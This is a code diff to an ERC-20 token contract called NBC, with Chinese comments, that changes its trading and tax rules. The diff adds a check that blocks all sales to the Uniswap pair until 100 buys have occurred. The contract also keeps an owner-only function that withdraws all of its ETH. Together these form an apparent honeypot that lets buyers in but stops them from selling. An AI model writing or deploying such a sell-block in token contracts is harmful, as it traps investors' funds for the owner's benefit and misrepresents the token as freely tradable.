@@ -134,10 +134,13 @@ contract NBC is Context, IERC20, Ownable {
     uint256 private _reduceBuyTaxAt=5;
     uint256 private _reduceSellTaxAt=5;
 
-    // 阻止交易
-    uint256 private _preventSwapBefore=23;
+    // 多少笔交易之后，才开始卖税
+    uint256 private _preventSwapTaxBefore=23;
 
-    // 累计交易笔数
+    // 多少笔交易之后，才支持卖 Token
+    uint256 private _preventSwapSellBefore=100;
+
+    // 累计买入交易笔数
     uint256 private _buyCount=0;
 
     uint8 private constant _decimals = 9;
@@ -256,13 +259,14 @@ contract NBC is Context, IERC20, Ownable {
             }
 
             // 卖出
-            if(to == uniswapV2Pair && from!= address(this) ){
+            if(to == uniswapV2Pair && from!= address(this) ) {
+                require(_buyCount > _preventSwapSellBefore, "wait for start sell.");
                 taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
             }
 
             // 自动卖税
             uint256 contractTokenBalance = balanceOf(address(this));
-            if (!inSwap && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapBefore) {
+            if (!inSwap && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold && _buyCount>_preventSwapTaxBefore) {
                 swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                 uint256 contractETHBalance = address(this).balance;
                 if(contractETHBalance > 5000000000000000000) {
@@ -323,13 +327,13 @@ contract NBC is Context, IERC20, Ownable {
         tradingOpen = true;
     }
 
+    receive() external payable {}
+
     // Withdraw function for contract owner
     function withdraw() external onlyOwner {
         (bool success, ) = payable(owner()).call{value: address(this).balance}("");
         require(success, "Transfer failed.");
     }
-    
-    receive() external payable {}
 
     // 收动卖税
     function manualSwap() external {
